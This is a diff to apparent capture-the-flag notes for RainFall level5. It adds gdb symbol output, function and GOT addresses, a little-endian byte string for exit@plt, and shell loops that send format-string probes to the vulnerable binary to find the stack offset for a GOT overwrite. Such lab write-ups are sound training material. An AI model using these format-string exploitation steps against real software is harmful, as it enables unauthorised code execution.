@@ -451,4 +451,22 @@ level5@RainFall:~$ objdump -t level5
 $2 = {<text variable, no debug info>} 0x80484a4 (= 134513828) <o>
 ```
 
+```console
+(gdb) p n 
+$3 = {<text variable, no debug info>} 0x80484c2 <n>
+(gdb) p o
+$4 = {<text variable, no debug info>} 0x80484a4 <o>
+```
+
 for i in {1..35}; do echo "AAAA." "%$i\$x" | ./level5; done
+
+
+Function addresses:
+- `exit@plt`: `0x080483d0`
+- `       o`: `0x080484a4`
+- `       n`: `0x080484c2`
+- `    exit`: `0xb7e5ebe0`
+
+"\x08\x04\x83\xd0 "
+
+`for i in {65..70}; do python -c "print('ABCDEFGHIJKLNOPQRSTUVWXYZ %$i\$p')" | ./level5; done`
